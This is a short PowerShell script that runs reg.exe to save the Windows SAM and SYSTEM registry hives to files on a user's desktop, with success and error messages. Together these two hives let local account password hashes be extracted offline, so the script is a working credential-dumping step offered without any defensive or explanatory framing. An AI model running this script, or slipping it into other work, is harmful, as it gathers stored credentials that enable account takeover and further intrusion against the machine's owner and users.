# Define the registry keys and destination paths
$registryKeys = @(
    @{
        Key = "HKLM\sam"
        Destination = "C:\Users\demo\Desktop\SAM"
    },
    @{
        Key = "HKLM\SYSTEM"
        Destination = "C:\Users\demo\Desktop\SYSTEM"
    }
)

# Loop through each registry key and save it
foreach ($item in $registryKeys) {
    $key = $item.Key
    $destination = $item.Destination

    try {
        Start-Process -FilePath "reg.exe" -ArgumentList "save", $key, $destination -Wait -NoNewWindow -PassThru
        Write-Host "Registry key '$key' saved successfully." -ForegroundColor Green
    } catch {
        Write-Host "Error occurred while saving the registry key '$key': $_" -ForegroundColor Red
    }
}
